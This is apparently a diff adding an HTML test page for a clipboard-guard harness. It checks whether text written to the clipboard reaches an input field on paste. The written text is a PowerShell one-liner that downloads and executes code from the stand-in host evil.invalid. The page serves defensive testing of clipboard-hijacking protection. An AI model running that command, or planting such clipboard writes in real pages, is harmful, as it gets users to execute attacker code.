@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><title>Read-back via Ctrl+V in a field</title>
+<script src="common.js"></script></head>
+<body><h1>Read-back via Ctrl+V in a field</h1>
+<button id="go">Write</button>
+<input id="sink" size="60"/>
+<script>
+const sink = document.getElementById("sink");
+let pasteSeen = null;
+sink.addEventListener("paste", e => {
+  pasteSeen = e.clipboardData.getData("text/plain");
+});
+// The harness clicks "Write" (which writes the command) and then sends a real Ctrl+V; the
+// input and the paste event should both receive the page's own text, read on "input".
+sink.addEventListener("input", () => {
+  window.__clipguardResult.read = sink.value || pasteSeen || "";
+  window.__clipguardResult.pasteEvent = pasteSeen;
+});
+document.getElementById("go").addEventListener("click", async () => {
+  await window.__clipguard.writeText("iex (iwr https://evil.invalid/cv -UseBasicParsing)");
+  // Not done yet: the harness sends Ctrl+V next, and the input handler records the result.
+  window.__clipguardResult.done = false;
+  sink.focus();
+});
+</script>
+</body></html>
